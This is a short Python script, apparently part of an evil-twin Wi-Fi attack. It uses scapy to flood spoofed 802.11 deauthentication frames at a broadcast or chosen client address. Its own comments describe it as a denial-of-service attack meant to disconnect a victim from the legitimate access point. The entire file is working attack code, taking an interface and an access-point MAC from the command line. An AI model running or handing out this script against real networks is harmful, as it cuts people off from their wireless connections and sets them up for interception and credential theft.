from scapy.all import *
import argparse



##########################################
# Understand the attack
#   we sending deauth packets 
#   this will cause denial of service
#   for us it does the job to disconnect 
#   the targeted mac from the "Good Twin"
###########################################


def deauth(gateway_mac, target_mac= "ff:ff:ff:ff:ff:ff", inter=0.1, count=None, loop=1, iface="wlx6c5ab03ab2f5", verbose=1):
    # addr2: source MAC
    # addr3: Access Point MAC
    packet =  RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
    # packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

if __name__ == "__main__":
    interface = sys.argv[1]
    accessPoint= sys.argv[2]
    deauth(gateway_mac=accessPoint, iface=interface)

    